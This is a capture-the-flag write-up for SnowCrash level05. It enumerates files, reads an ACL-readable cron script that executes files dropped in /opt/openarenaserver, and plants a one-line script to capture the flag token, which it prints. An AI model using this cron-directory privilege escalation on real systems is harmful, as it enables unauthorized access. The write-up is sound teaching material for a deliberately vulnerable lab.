# SnowCrash

## Level05
```sh
level05@SnowCrash:~$ ls -la
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
-r-x------  1 level05 level05  675 Apr  3  2012 .profile

level05@SnowCrash:~$ find / -user level05 2>/dev/null | grep -v proc

level05@SnowCrash:~$ find / -user flag05 2>/dev/null | grep -v proc
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

```sh
level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
```

We can see that our current user has no right on this file but the + indicates that the file has extended permissions (via ACLs)

Let's check them
```sh
level05@SnowCrash:~$ getfacl /usr/sbin/openarenaserver
getfacl: Removing leading '/' from absolute path names
# file: usr/sbin/openarenaserver
# owner: flag05
# group: flag05
user::rwx
user:level05:r--
group::r-x
mask::r-x
other::---
```

We are able to read the file so let's see
```sh
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

This bash script iterates over every file in /opt/openarenaserver directory
It execute the file and then delete it

Since we do not have permission to execute it, it might get executed automatically from a cronjob or some other event, let's try it

## Exploit

```sh
level05@SnowCrash:~$ echo "getflag" > /opt/openarenaserver/exploit.sh
level05@SnowCrash:~$ ls -l /opt/openarenaserver
total 4
-rw-rw-r--+ 1 level05 level05 8 Mar  6 13:25 exploit.sh
```

Let's wait a few minutes to check if it's being executed periodically via a cronjob

```sh
level05@SnowCrash:~$ ls -l /opt/openarenaserver
total 0
```

Perfect! Our script got removed but we have no traces of it, let's write the output of getflag into a tmp file in order to retrieve it

```sh
level05@SnowCrash:~$ echo "getflag > /tmp/flag" > /opt/openarenaserver/exploit.sh
level05@SnowCrash:~$ ls -l /opt/openarenaserver
total 4
-rw-rw-r--+ 1 level05 level05 20 Mar  6 13:31 exploit.sh
```

```sh
level05@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```